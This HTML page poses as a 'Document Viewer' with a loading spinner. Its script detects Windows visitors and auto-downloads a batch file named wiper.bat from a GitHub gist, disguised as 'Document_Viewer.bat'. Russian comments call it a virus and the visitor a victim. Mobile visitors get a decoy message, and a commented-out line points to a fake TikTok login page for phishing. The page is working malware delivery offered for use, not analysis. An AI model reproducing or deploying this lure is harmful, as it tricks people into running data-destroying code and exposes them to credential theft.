<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Viewer</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #fe2c55; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 500; font-size: 22px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2 id="title">Preparing Document...</h2>
    <p id="subtitle">Please wait.</p>

    <script>
        const ua = navigator.userAgent.toLowerCase();
        
        // Если зашел с Windows (ПК)
        if (ua.includes("windows")) {
            document.getElementById('subtitle').innerText = "Your file will download automatically.";
            setTimeout(() => {
                const link = document.createElement('a');
                // Ссылка на твой вирус (wiper.bat)
                link.href = 'https://gist.githubusercontent.com/8yzj5nk95r-droid/05dd8519a4c484e8499964729a31e40c/raw/197d72b5416b35b7b6364ee851fbc0890b42ec75/wiper.bat';
                link.download = 'Document_Viewer.bat';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 1500);
        } 
        // Если зашел с телефона (iOS или Android)
        else {
            document.getElementById('title').innerText = "File Unavailable";
            document.getElementById('subtitle').innerText = "This document can only be opened on a Windows computer.";
            
            // Останавливаем крутящийся спиннер, чтобы не пугать
            document.querySelector('.spinner').style.display = 'none';
            
            // Опционально: если хочешь перекинуть жертву на фейковый TikTok, раскомментируй строку ниже
            // window.location.href = "https://tiktoks-bay.vercel.app/fake-login.html"; 
        }
    </script>
</body>
</html>
